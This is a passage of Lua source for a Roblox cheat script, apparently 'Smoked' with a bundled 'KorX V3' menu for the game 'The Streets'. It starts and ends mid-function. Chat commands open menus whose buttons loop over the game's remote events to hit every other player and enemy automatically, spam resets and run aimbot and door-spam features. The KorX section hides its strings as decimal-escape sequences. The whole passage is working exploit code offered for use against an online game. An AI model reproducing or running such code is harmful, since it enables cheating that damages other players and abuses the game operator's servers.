WalkSpeed.Position = UDim2.new(0.53634578, 0, 0.254409373, 0)
WalkSpeed.Size = UDim2.new(0, 200, 0, 50)
WalkSpeed.Font = Enum.Font.GothamBold
WalkSpeed.Text = "WalkSpeed"
WalkSpeed.TextColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed.TextScaled = true
WalkSpeed.TextSize = 14.000
WalkSpeed.TextWrapped = true
 
PaintBall.Name = "PaintBall"
PaintBall.Parent = main
PaintBall.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
PaintBall.Position = UDim2.new(0.53634578, 0, 0.606522083, 0)
PaintBall.Size = UDim2.new(0, 200, 0, 50)
PaintBall.Font = Enum.Font.GothamBold
PaintBall.Text = "PaintBall"
PaintBall.TextColor3 = Color3.fromRGB(0, 0, 0)
PaintBall.TextScaled = true
PaintBall.TextSize = 14.000
PaintBall.TextWrapped = true
 
Fly.Name = "Fly"
Fly.Parent = main
Fly.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
Fly.Position = UDim2.new(0.0137524605, 0, 0.606522083, 0)
Fly.Size = UDim2.new(0, 200, 0, 50)
Fly.Font = Enum.Font.GothamBold
Fly.Text = "Fly"
Fly.TextColor3 = Color3.fromRGB(0, 0, 0)
Fly.TextScaled = true
Fly.TextSize = 14.000
Fly.TextWrapped = true
 
Openmain.Name = "Openmain"
Openmain.Parent = FirstScript
Openmain.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Openmain.Position = UDim2.new(0, 0, 0.54080224, 0)
Openmain.Size = UDim2.new(0, 133, 0, 48)
 
Open.Name = "Smoked Paid Is Working."
Open.Parent = Openmain
Open.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Open.Position = UDim2.new(-0.00363767147, 0, -0.00394366682, 0)
Open.Size = UDim2.new(0, 133, 0, 48)
Open.Font = Enum.Font.GothamBold
Open.Text = "Smoked Paid Is Working."
Open.TextColor3 = Color3.fromRGB(0, 0, 0)
Open.TextScaled = true
Open.TextSize = 14.000
Open.TextWrapped = true
end
end)
---------------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+hotkeys") then
    
plr = game:GetService('Players').LocalPlayer
B1 = 0
B2 = 0
B3 = 0
B4 = 0
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local Frame_3 = Instance.new("Frame")
local GuiCredit = Instance.new("TextLabel")
local ScriptCredit = Instance.new("TextLabel")
local GameName = Instance.new("TextLabel")
local Button1 = Instance.new("TextButton")
local Button2 = Instance.new("TextButton")
local Button3 = Instance.new("TextButton")
local Light2 = Instance.new("TextLabel")
local Button4 = Instance.new("TextButton")
local Light4 = Instance.new("TextLabel")
local Light1 = Instance.new("TextLabel")
local Light3 = Instance.new("TextLabel")
ScreenGui.Parent = game.CoreGui
Frame.Parent = ScreenGui
Frame.Active = true
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 0.44999998807907
Frame.BorderSizePixel = 0
Frame.LayoutOrder = 1
Frame.Position = UDim2.new(0, 510, 0, 204)
Frame.Selectable = true
Frame.Size = UDim2.new(0, 394, 0, 223)
Frame.Draggable = true
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.new(0.47451, 0.47451, 0.47451)
Frame_2.BackgroundTransparency = 0.5
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0, 0, 1, 0)
Frame_2.Size = UDim2.new(0, 402, 0, 8)
Frame_3.Parent = Frame
Frame_3.BackgroundColor3 = Color3.new(0.47451, 0.47451, 0.47451)
Frame_3.BackgroundTransparency = 0.5
Frame_3.BorderSizePixel = 0
Frame_3.Position = UDim2.new(1, 0, 0, 0)
Frame_3.Size = UDim2.new(0, 8, 0, 223)
Button1.TextWrapped = true
Button2.TextWrapped = true
Button3.TextWrapped = true
Button4.TextWrapped = true
GuiCredit.Name = "GuiCredit"
GuiCredit.Parent = Frame
GuiCredit.BackgroundColor3 = Color3.new(1, 1, 1)
GuiCredit.BackgroundTransparency = 1
GuiCredit.Position = UDim2.new(0, 0, 0.905829608, 0)
GuiCredit.Size = UDim2.new(0, 194, 0, 21)
GuiCredit.Font = Enum.Font.SourceSans
GuiCredit.TextColor3 = Color3.new(0, 0, 0)
GuiCredit.TextSize = 16
ScriptCredit.Name = "ScriptCredit"
ScriptCredit.Parent = Frame
ScriptCredit.BackgroundColor3 = Color3.new(1, 1, 1)
ScriptCredit.BackgroundTransparency = 1
ScriptCredit.Position = UDim2.new(0, 194, 0, 202)
ScriptCredit.Size = UDim2.new(0, 208, 0, 21)
ScriptCredit.Font = Enum.Font.SourceSans
ScriptCredit.TextColor3 = Color3.new(0, 0, 0)
ScriptCredit.TextSize = 16
ScriptCredit.TextWrapped = true
GameName.Name = "GameName"
GameName.Parent = Frame
GameName.BackgroundColor3 = Color3.new(1, 1, 1)
GameName.BackgroundTransparency = 1
GameName.BorderSizePixel = 0
GameName.Size = UDim2.new(0, 394, 0, 21)
GameName.Font = Enum.Font.SourceSans
GameName.TextColor3 = Color3.new(0, 0, 0)
GameName.TextSize = 16
Button1.Name = "Button1"
Button1.Parent = Frame
Button1.BackgroundColor3 = Color3.new(0.47451, 0.47451, 0.47451)
Button1.BackgroundTransparency = 0.40000000596046
Button1.BorderColor3 = Color3.new(0.32549, 0.32549, 0.32549)
Button1.BorderSizePixel = 0
Button1.Position = UDim2.new(0, 23, 0, 49)
Button1.Size = UDim2.new(0, 149, 0, 45)
Button1.Font = Enum.Font.SourceSans
Button1.Text = ""
Button1.TextColor3 = Color3.new(0, 0, 0)
Button1.TextSize = 14
Button2.Name = "Button2"
Button2.Parent = Frame
Button2.BackgroundColor3 = Color3.new(0.47451, 0.47451, 0.47451)
Button2.BackgroundTransparency = 0.40000000596046
Button2.BorderColor3 = Color3.new(0.32549, 0.32549, 0.32549)
Button2.BorderSizePixel = 0
Button2.Position = UDim2.new(0, 23, 0, 127)
Button2.Size = UDim2.new(0, 149, 0, 46)
Button2.Font = Enum.Font.SourceSans
Button2.Text = ""
Button2.TextColor3 = Color3.new(0, 0, 0)
Button2.TextSize = 14
Button3.Name = "Button3"
Button3.Parent = Frame
Button3.BackgroundColor3 = Color3.new(0.47451, 0.47451, 0.47451)
Button3.BackgroundTransparency = 0.40000000596046
Button3.BorderColor3 = Color3.new(0.32549, 0.32549, 0.32549)
Button3.BorderSizePixel = 0
Button3.Position = UDim2.new(0, 223, 0, 49)
Button3.Size = UDim2.new(0, 149, 0, 45)
Button3.Font = Enum.Font.SourceSans
Button3.Text = ""
Button3.TextColor3 = Color3.new(0, 0, 0)
Button3.TextSize = 14
Light2.Name = "Light2"
Light2.Parent = Frame
Light2.BackgroundColor3 = Color3.new(0, 0, 0)
Light2.BorderSizePixel = 0
Light2.Position = UDim2.new(0, 162, 0, 127)
Light2.Size = UDim2.new(0, 10, 0, 10)
Light2.Font = Enum.Font.SourceSans
Light2.Text = ""
Light2.TextColor3 = Color3.new(0, 0, 0)
Light2.TextSize = 14
Button4.Name = "Button4"
Button4.Parent = Frame
Button4.BackgroundColor3 = Color3.new(0.47451, 0.47451, 0.47451)
Button4.BackgroundTransparency = 0.40000000596046
Button4.BorderColor3 = Color3.new(0.32549, 0.32549, 0.32549)
Button4.BorderSizePixel = 0
Button4.Position = UDim2.new(0, 223, 0, 127)
Button4.Size = UDim2.new(0, 149, 0, 46)
Button4.Font = Enum.Font.SourceSans
Button4.Text = ""
Button4.TextColor3 = Color3.new(0, 0, 0)
Button4.TextSize = 14
Light4.Name = "Light4"
Light4.Parent = Frame
Light4.BackgroundColor3 = Color3.new(0, 0, 0)
Light4.BorderSizePixel = 0
Light4.Position = UDim2.new(0, 362, 0, 127)
Light4.Size = UDim2.new(0, 10, 0, 10)
Light4.Font = Enum.Font.SourceSans
Light4.Text = ""
Light4.TextColor3 = Color3.new(0, 0, 0)
Light4.TextSize = 14
Light1.Name = "Light1"
Light1.Parent = Frame
Light1.BackgroundColor3 = Color3.new(0, 0, 0)
Light1.BorderSizePixel = 0
Light1.Position = UDim2.new(0, 162, 0, 49)
Light1.Size = UDim2.new(0, 10, 0, 10)
Light1.Font = Enum.Font.SourceSans
Light1.Text = ""
Light1.TextColor3 = Color3.new(0, 0, 0)
Light1.TextSize = 14
Light3.Name = "Light3"
Light3.Parent = Frame
Light3.BackgroundColor3 = Color3.new(0, 0, 0)
Light3.BorderSizePixel = 0
Light3.Position = UDim2.new(0, 362, 0, 49)
Light3.Size = UDim2.new(0, 10, 0, 10)
Light3.Font = Enum.Font.SourceSans
Light3.Text = ""
Light3.TextColor3 = Color3.new(0, 0, 0)
Light3.TextSize = 14
-------------------------------
GuiCredit.Text = "Smoked v1.42" 
ScriptCredit.Text = "dollar#0007 / aimcancel"-- credit yourself here if you made the script
GameName.Text = "The Streets Smoked Keybinds."--Enter the game name you are exploiting
-------------------------------
Button1.Text = "F - Fly."

Button2.Text = "X - Noclip."

Button3.Text = "C - Reset."

Button4.Text = "H - Hipheight."
--------------------------------

Button1.MouseButton1Click:connect(function()
	if B1 == 0 then
		B1 = 1
		Light1.BackgroundColor3 = Color3.fromRGB(255, 255, 255) --White
		while B1 == 1 do
      game:GetService('RunService').Stepped:wait()
			for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
				local check = v:FindFirstChildOfClass("Model")
				if check ~= nil and B1 == 1 then
					local weapon = game.Workspace[plr.Name]:FindFirstChildOfClass("Tool")
					if weapon ~= nil then
						game:GetService('RunService').Stepped:wait()
						local A_1 = v.Humanoid
						local A_2 = weapon.Name
						local Event = game:GetService("ReplicatedStorage").Remotes.Hit
						Event:FireServer(A_1, A_2)
					else
						print('Equip a Shurkin')
						B1 = 0
						Light1.BackgroundColor3 = Color3.fromRGB(0, 0, 0) --Black
					end
				end
			end
		end
	elseif B1 == 1 then
		B1 = 0
		Light1.BackgroundColor3 = Color3.fromRGB(0, 0, 0) --Black
	end
end)

Button2.MouseButton1Click:connect(function()
	if B2 == 0 then
		B2 = 1
		Light2.BackgroundColor3 = Color3.fromRGB(255, 255, 255) --White
		while B2 == 1 do
			game:GetService('RunService').Stepped:wait()
			for i,players in pairs(game.Players:GetChildren()) do
				if players.Name ~= plr.Name and B2 == 1 then
					for a,work in pairs(game.Workspace:GetChildren()) do
						if B2 == 1 and players.Name == work.Name then
							local weapon = game.Workspace[plr.Name]:FindFirstChildOfClass("Tool")
							if weapon ~= nil and B2 == 1 then
  								game:GetService('RunService').Stepped:wait()
  								local Remote = game.ReplicatedStorage.Remotes['Hit']
  								
  								local Arguments = {
  								        [1] = Workspace[work.Name].Humanoid,
  								        [2] = weapon.Name
  								}
  								
  								Remote:FireServer(unpack(Arguments))
							else
								B2 = 0
								Light2.BackgroundColor3 = Color3.fromRGB(0, 0, 0) --Black
								print('Equip a weapon')
							end
						end
					end
				end
			end
		end
	elseif B2 == 1 then
		B2 = 0
		Light2.BackgroundColor3 = Color3.fromRGB(0, 0, 0) --Black
	end
end)
Button3.MouseButton1Click:connect(function()
	if B3 == 0 then
		B3 = 1
		Light3.BackgroundColor3 = Color3.fromRGB(255, 255, 255) --White
		while B3 == 1 do
  			local Remote = game.ReplicatedStorage.Remotes['Reset']
  			
  			local Arguments = {
  			        [1] = "3e71eo932P"
  			}
  			
  			Remote:InvokeServer(unpack(Arguments))
      		game:GetService('RunService').Stepped:wait()
		end
	elseif B3 == 1 then
		B3 = 0
		Light3.BackgroundColor3 = Color3.fromRGB(0, 0, 0) --Black
	end
end)
Button4.MouseButton1Click:connect(function()
	if B4 == 0 then
		B4 = 1
		Light4.BackgroundColor3 = Color3.fromRGB(255, 255, 255) --White
		while B4 == 1 do
			game:GetService('RunService').Stepped:wait()
			for i,v in pairs(game.Workspace:GetChildren()) do
				if v.Name == "Punching Bag" and B4 == 1 then
					local check = v.Bag:FindFirstChild("Model")
					if check ~= nil and v.Dead ~= true and B4 == 1 then
						local Remote = game.ReplicatedStorage.Remotes['HitBag']
								
						local Arguments = {
						        [1] = v.Bag.Model.Bag
						}
						
						Remote:FireServer(unpack(Arguments))
					end
				end
			end
		end
	elseif B4 == 1 then
		B4 = 0
		Light4.BackgroundColor3 = Color3.fromRGB(0, 0, 0) --Black
	end
end)
end
end)
------------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+korx") then
    
local pm = Instance.new("\70\114\97\109\101")
local gp = Instance.new("\70\114\97\109\101")
local cg = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local rc = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local ar = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local fa = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local s = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local js = Instance.new("\70\114\97\109\101")
local qdtenb_11 = Instance.new("\84\101\120\116\76\97\98\101\108")
local n = Instance.new("\70\114\97\109\101")
local en = Instance.new("\70\114\97\109\101")
local t = Instance.new("\70\114\97\109\101")
local d = Instance.new("\84\101\120\116\76\97\98\101\108")
local q = Instance.new("\84\101\120\116\76\97\98\101\108")
local arcgpm_oi = Instance.new("\84\101\120\116\76\97\98\101\108")
local nbjsfarcg = Instance.new("\84\101\120\116\76\97\98\101\108")
local i = Instance.new("\84\101\120\116\76\97\98\101\108")
local oi = Instance.new("\84\101\120\116\76\97\98\101\108")
local jsfa_2 = Instance.new("\70\114\97\109\101")
local m_oiklqdtenb_o = Instance.new("\84\101\120\116\76\97\98\101\108")
local pm_ = Instance.new("\70\114\97\109\101")
local gpm = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local cgp = Instance.new("\83\99\114\101\101\110\71\117\105")
local dtenbjsfarc = game:GetService('RunService').Heartbeat
local arc = Instance.new("\70\114\97\109\101")
local far = Instance.new("\73\109\97\103\101\76\97\98\101\108")
local sf = Instance.new("\70\114\97\109\101")
local sf_2 = Instance.new("\70\114\97\109\101")
local qdtenb = Instance.new("\84\101\120\116\76\97\98\101\108")
local nb = Instance.new("\70\114\97\109\101")
local enb = Instance.new("\70\114\97\109\101")
local nb_3 = Instance.new("\70\114\97\109\101")
local nb_4 = Instance.new("\70\114\97\109\101")
local qd = Instance.new("\70\114\97\109\101")
local lq = Instance.new("\70\114\97\109\101")
local kl = Instance.new("\84\101\120\116\76\97\98\101\108")
local ik = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local oik = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local _oi = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local m_oi = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local pm_o = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local gpm_ = Instance.new("\70\114\97\109\101")
local cgpm = Instance.new("\84\101\120\116\76\97\98\101\108")
local rcgp = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local arcg = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local farc = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local sfa = Instance.new("\70\114\97\109\101")
local jsfa = Instance.new("\70\114\97\109\101")
local qdtenb_4 = Instance.new("\84\101\120\116\76\97\98\101\108")
local nbj = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local enbj = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local ten = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local ten_2 = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local ten_3 = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local ten_4 = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local klq = Instance.new("\70\114\97\109\101")
local ikl = Instance.new("\70\114\97\109\101")
local oikl = Instance.new("\84\101\120\116\76\97\98\101\108")
local _oik = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local m_oik = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local pm_oi = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local gpm_o = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local cgpm_ = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local rcgpm = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local arcgp = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local farcg = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local sfar = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local jsfar = Instance.new("\70\114\97\109\101")
local bjsfa = Instance.new("\70\114\97\109\101")
local nbjs = Instance.new("\84\101\120\116\76\97\98\101\108")
local enbjs = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local tenb = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local dten = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local qdte = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local lqdt = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local klqd = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local iklq = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local oiklq = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local _oikl = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local m_oikl = Instance.new("\70\114\97\109\101")
local pm_oik = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local gpm_oi = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local cgpm_o = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local rcgpm_ = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local arcgpm = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local farcgp = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local sfarc = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local jsfarc = Instance.new("\70\114\97\109\101")
local bjsfar = Instance.new("\84\101\120\116\76\97\98\101\108")
local nbjsf = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local enbjsf = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local sf_3 = Instance.new("\70\114\97\109\101")
local dtenb = Instance.new("\70\114\97\109\101")
local qdtenb_8 = Instance.new("\84\101\120\116\76\97\98\101\108")
local lqdte = Instance.new("\70\114\97\109\101")
local klqdt = Instance.new("\70\114\97\109\101")
local iklqd = Instance.new("\73\109\97\103\101\76\97\98\101\108")
local oiklqd = Instance.new("\70\114\97\109\101")
local _oiklq = Instance.new("\70\114\97\109\101")
local m_oiklq = Instance.new("\84\101\120\116\76\97\98\101\108")
local pm_oikl = Instance.new("\70\114\97\109\101")
local gpm_oik = Instance.new("\70\114\97\109\101")
local cgpm_oi = Instance.new("\84\101\120\116\76\97\98\101\108")
local rcgpm_o = Instance.new("\84\101\120\116\66\111\120")
local arcgpm_ = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local farcgpm = Instance.new("\84\101\120\116\66\117\116\116\111\110")
wait(0.3)
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\75\111\114\88\32\86\51\32\104\97\115\32\98\101\101\110\32\115\117\99\99\101\115\115\102\117\108\108\121\32\101\120\101\99\117\116\101\100\44\32\112\108\101\97\115\101\32\101\110\116\101\114\32\121\111\117\114\32\107\101\121\32\116\111\32\112\114\111\99\101\101\100\33";
})
cgp.Name = "\75\111\114\88\32\86\51\32\40\87\73\80\41"
cgp.Parent = game.CoreGui
arc.Name = "\77\97\105\110\70\114\97\109\101"
arc.Parent = cgp
arc.BackgroundColor3 = Color3.new(0, 0, 0)
arc.BackgroundTransparency = 0.5
arc.Position = UDim2.new(0, 0, 1.70000005, 0)
arc.Size = UDim2.new(0, 982, 0, 547)
arc.BorderColor3 = Color3.new(255, 0, 0)
arc.BorderSizePixel = 9
pm_.Name = "\84\111\103\103\108\101\70\114\97\109\101"
pm_.Parent = cgp
pm_.BackgroundColor3 = Color3.new(0, 0, 0)
pm_.BackgroundTransparency = 0.5
pm_.BorderColor3 = Color3.new(1, 0, 0)
pm_.BorderSizePixel = 9
pm_.Position = UDim2.new(0.00435729884, 0, 0.491965383, 0)
pm_.Size = UDim2.new(0, 105, 0, 36)
pm_.Visible = false
gpm.Name = "\84\111\103\103\108\101\66\117\116\116\111\110"
gpm.Parent = pm_
gpm.BackgroundColor3 = Color3.new(1, 1, 1)
gpm.BackgroundTransparency = 1
gpm.Size = UDim2.new(0, 105, 0, 36)
gpm.Font = Enum.Font.Garamond
gpm.Text = "\79\80\69\78\32\47\32\67\76\79\83\69"
gpm.TextColor3 = Color3.new(1, 1, 1)
gpm.TextSize = 21
gpm.TextWrapped = true
far.Name = "\77\70\75\79\82\88"
far.Parent = arc
far.Active = true
far.BackgroundColor3 = Color3.new(1, 1, 1)
far.BackgroundTransparency = 1
far.Position = UDim2.new(0.010183299, 0, 0.0182815362, 0)
far.Size = UDim2.new(0, 962, 0, 527)
far.Image = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\53\51\48\52\51\56\57\49\56"
far.ImageColor3 = Color3.new(1, 0, 0.0156863)
far.ImageTransparency = 0.1
sf.Name = "\77\70\84\105\116\108\101\66\111\120"
sf.Parent = arc
sf.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
sf.BackgroundTransparency = 0.5
sf.Position = UDim2.new(0.409368634, 0, 0.0400000066, 0)
sf.Size = UDim2.new(0, 177, 0, 67)
n.Name = "\72\101\108\112\70\114\97\109\101"
n.Parent = cgp
n.BackgroundColor3 = Color3.new(0, 0, 0)
n.BackgroundTransparency = 0.5
n.BorderColor3 = Color3.new(1, 0, 0)
n.Visible = false
n.BorderSizePixel = 9
n.Position = UDim2.new(0.825, 0, 0.305, 0)
n.Size = UDim2.new(0, 272, 0, 295)
en.Name = "\49\72\101\108\112\70\114\97\109\101"
en.Parent = n
en.BackgroundColor3 = Color3.new(1, 1, 1)
en.BackgroundTransparency = 0.60000002384186
en.Position = UDim2.new(0.033088237, 0, 0.0384111814, 0)
en.Size = UDim2.new(0, 254, 0, 274)
t.Name = "\50\72\101\108\112\70\114\97\109\101"
t.Parent = en
t.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
t.BackgroundTransparency = 0.30000001192093
t.Position = UDim2.new(0.0622467287, 0, 0.208756715, 0)
t.Size = UDim2.new(0, 221, 0, 204)
d.Name = "\104\101\108\112\91\49\93"
d.Parent = t
d.BackgroundColor3 = Color3.new(1, 1, 1)
d.BackgroundTransparency = 1
d.Position = UDim2.new(0.0497737564, 0, 0.0294117648, 0)
d.Size = UDim2.new(0, 200, 0, 27)
d.Font = Enum.Font.Garamond
d.Text = "\91\49\93\32\82\105\103\104\116\32\99\108\105\99\107\32\111\110\32\39\65\73\77\66\79\84\39\32\116\111\32\115\101\108\101\99\116\32\39\82\65\80\73\68\32\71\76\79\67\75\39"
d.TextColor3 = Color3.new(0, 0, 0)
d.TextScaled = true
d.TextSize = 14
d.TextWrapped = true
q.Name = "\104\101\108\112\91\50\93"
q.Parent = t
q.BackgroundColor3 = Color3.new(1, 1, 1)
q.BackgroundTransparency = 1
q.Position = UDim2.new(0.0497737564, 0, 0.200980395, 0)
q.Size = UDim2.new(0, 200, 0, 27)
q.Font = Enum.Font.Garamond
q.Text = "\91\50\93\32\82\105\103\104\116\32\99\108\105\99\107\32\111\110\32\39\83\80\73\78\39\32\116\111\32\115\101\108\101\99\116\32\97\32\102\97\115\116\101\114\32\39\83\80\73\78\39"
q.TextColor3 = Color3.new(0, 0, 0)
q.TextScaled = true
q.TextSize = 14
q.TextWrapped = true
arcgpm_oi.Name = "\104\101\108\112\91\51\93"
arcgpm_oi.Parent = t
arcgpm_oi.BackgroundColor3 = Color3.new(1, 1, 1)
arcgpm_oi.BackgroundTransparency = 1
arcgpm_oi.Position = UDim2.new(0.0497737564, 0, 0.377451003, 0)
arcgpm_oi.Size = UDim2.new(0, 200, 0, 27)
arcgpm_oi.Font = Enum.Font.Garamond
arcgpm_oi.Text = "\91\51\93\32\83\99\114\111\108\108\32\100\111\119\110\32\111\110\32\39\66\70\71\39\32\116\111\32\39\83\72\79\84\84\89\32\83\67\65\84\84\69\82\39"
arcgpm_oi.TextColor3 = Color3.new(0, 0, 0)
arcgpm_oi.TextScaled = true
arcgpm_oi.TextSize = 14
arcgpm_oi.TextWrapped = true
nbjsfarcg.Name = "\104\101\108\112\91\52\93"
nbjsfarcg.Parent = t
nbjsfarcg.BackgroundColor3 = Color3.new(1, 1, 1)
nbjsfarcg.BackgroundTransparency = 1
nbjsfarcg.Position = UDim2.new(0.0497737564, 0, 0.539215744, 0)
nbjsfarcg.Size = UDim2.new(0, 200, 0, 27)
nbjsfarcg.Font = Enum.Font.Garamond
nbjsfarcg.Text = "\91\52\93\32\83\99\114\111\108\108\32\117\112\32\111\110\32\39\66\70\71\39\32\116\111\32\39\71\76\79\67\75\32\83\67\65\84\84\69\82\39"
nbjsfarcg.TextColor3 = Color3.new(0, 0, 0)
nbjsfarcg.TextScaled = true
nbjsfarcg.TextSize = 14
nbjsfarcg.TextWrapped = true
i.Name = "\104\101\108\112\91\53\93"
i.Parent = t
i.BackgroundColor3 = Color3.new(1, 1, 1)
i.BackgroundTransparency = 1
i.Position = UDim2.new(0.0497737564, 0, 0.671568632, 0)
i.Size = UDim2.new(0, 200, 0, 27)
i.Font = Enum.Font.Garamond
i.Text = "\91\53\93\32\82\105\103\104\116\32\99\108\105\99\107\32\111\110\32\39\68\79\79\82\32\85\78\76\79\67\75\39\32\116\111\32\39\68\79\79\82\32\83\80\65\77\39"
i.TextColor3 = Color3.new(0, 0, 0)
i.TextScaled = true
i.TextSize = 14
i.TextWrapped = true
oi.Name = "\104\101\108\112\91\100\105\115\99\93"
oi.Parent = t
oi.BackgroundColor3 = Color3.new(1, 1, 1)
oi.BackgroundTransparency = 1
oi.Position = UDim2.new(0, 0, 0.838235319, 0)
oi.Size = UDim2.new(0, 211, 0, 33)
oi.Font = Enum.Font.Garamond
oi.Text = "\71\111\116\32\97\110\121\32\112\114\111\98\108\101\109\115\63\32\67\111\110\116\97\99\116\32\109\101\32\111\110\32\100\105\115\99\111\114\100\58\32\75\111\114\95\101\35\54\52\55\53"
oi.TextColor3 = Color3.new(1, 0, 0)
oi.TextScaled = true
oi.TextSize = 14
oi.TextWrapped = true
jsfa_2.Name = "\77\105\115\99\32\84\105\116\108\101"
jsfa_2.Parent = en
jsfa_2.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
jsfa_2.BackgroundTransparency = 0.5
jsfa_2.Position = UDim2.new(0.184486702, 0, 0.0311119296, 0)
jsfa_2.Size = UDim2.new(0, 160, 0, 34)
m_oiklqdtenb_o.Parent = jsfa_2
m_oiklqdtenb_o.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
m_oiklqdtenb_o.BackgroundTransparency = 0.5
m_oiklqdtenb_o.Position = UDim2.new(4.65661287e-10, 0, -2.98023224e-08, 0)
m_oiklqdtenb_o.Size = UDim2.new(0, 160, 0, 34)
m_oiklqdtenb_o.Font = Enum.Font.Garamond
m_oiklqdtenb_o.Text = "\91\72\69\76\80\47\69\88\84\82\65\83\93"
m_oiklqdtenb_o.TextColor3 = Color3.new(0, 0, 0)
m_oiklqdtenb_o.TextScaled = true
m_oiklqdtenb_o.TextSize = 14
m_oiklqdtenb_o.TextWrapped = true
sf_2.Name = "\77\70\84\105\116\108\101\66\111\120"
sf_2.Parent = arc
sf_2.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
sf_2.BackgroundTransparency = 0.5
sf_2.Position = UDim2.new(0.415478587, 0, 0.0509090759, 0)
sf_2.Size = UDim2.new(0, 164, 0, 54)
qdtenb.Parent = sf_2
qdtenb.BackgroundColor3 = Color3.new(1, 1, 1)
qdtenb.BackgroundTransparency = 1
qdtenb.Position = UDim2.new(0.024390243, 0, 0.0740740746, 0)
qdtenb.Size = UDim2.new(0, 156, 0, 46)
qdtenb.Font = Enum.Font.Garamond
qdtenb.Text = "\91\75\111\114\88\32\86\51\93"
qdtenb.TextColor3 = Color3.new(0, 0, 0)
qdtenb.TextScaled = true
qdtenb.TextSize = 14
qdtenb.TextWrapped = true
qd.Name = "\71\117\110\115\32\47\32\82\97\100\105\111\32\77\101\110\117"
qd.Parent = arc
qd.BackgroundColor3 = Color3.new(1, 1, 1)
qd.BackgroundTransparency = 0.60000002384186
qd.Position = UDim2.new(0.214867622, 0, 0.0400000103, 0)
qd.Size = UDim2.new(0, 177, 0, 503)
lq.Name = "\71\117\110\32\116\105\116\108\101"
lq.Parent = qd
lq.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
lq.BackgroundTransparency = 0.5
lq.Position = UDim2.new(0.047786735, 0, 0.0305817239, 0)
lq.Size = UDim2.new(0, 160, 0, 34)
kl.Parent = lq
kl.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
kl.BackgroundTransparency = 0.5
kl.Size = UDim2.new(0, 160, 0, 34)
kl.Font = Enum.Font.Garamond
kl.Text = "\91\71\117\110\115\93"
kl.TextColor3 = Color3.new(0, 0, 0)
kl.TextScaled = true
kl.TextSize = 14
kl.TextWrapped = true
ik.Name = "\66\70\71"
ik.Parent = qd
ik.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
ik.BackgroundTransparency = 0.30000001192093
ik.Position = UDim2.new(0.047786735, 0, 0.133200794, 0)
ik.Size = UDim2.new(0, 160, 0, 40)
ik.Font = Enum.Font.Garamond
ik.Text = "\66\70\71\32\40\112\114\101\115\115\32\39\113\39\32\116\111\32\116\111\103\103\108\101\41"
ik.TextColor3 = Color3.new(0, 0, 0)
ik.TextSize = 14
ik.TextWrapped = true
ik.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
